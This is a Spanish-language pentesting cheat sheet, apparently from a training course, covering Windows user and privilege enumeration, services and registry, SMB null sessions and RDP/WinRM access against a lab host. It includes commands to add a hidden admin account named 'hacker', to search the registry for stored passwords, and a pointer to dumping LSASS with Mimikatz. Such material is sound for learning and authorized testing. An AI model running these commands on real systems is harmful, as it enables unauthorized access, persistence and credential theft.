2. Usuarios, grupos y privilegios

> whoami /priv            # privilegios (SeImpersonate = ¡escalada!)
> whoami /groups
> net user                # usuarios locales
> net user administrador   # info de un usuario
> net localgroup administrators   # quién es admin local
> net user hacker Passw0rd! /add   # crear usuario (con permisos)
> net localgroup administrators hacker /add
📘 Cuentas especialesAdministrator = admin local. NT AUTHORITY\SYSTEM = la cuenta más poderosa de la máquina (equivale a root). Domain Admins = dios de todo el dominio Active Directory.

3. Servicios y registro

> sc query               # servicios
> sc qc nombre_servicio  # config (ruta del binario)
> wmic service list brief
> reg query HKLM\Software  # registro = base de datos de config de Windows
⚠️ Dónde se esconden credenciales en WindowsFicheros Unattend.xml, sysprep.xml, web.config, el registro (reg query HKLM /f password /t REG_SZ /s), y la memoria del proceso LSASS (Mimikatz).

4. SMB y recursos compartidos

📘 SMBProtocolo de Windows para compartir carpetas e impresoras (puerto 445). Un “share” es una carpeta compartida. A veces hay shares accesibles sin contraseña (null session).
# Desde Kali
$ smbclient -L //10.0.2.5/ -N            # listar shares sin credenciales
$ smbclient //10.0.2.5/Compartido -N     # conectar
$ crackmapexec smb 10.0.2.5 -u '' -p ''  # comprobar null session

5. RDP y WinRM: acceso remoto

$ xfreerdp /u:admin /p:Passw0rd! /v:10.0.2.5     # escritorio remoto (3389)
$ evil-winrm -i 10.0.2.5 -u admin -p 'Passw0rd!'  # PowerShell remoto (5985)
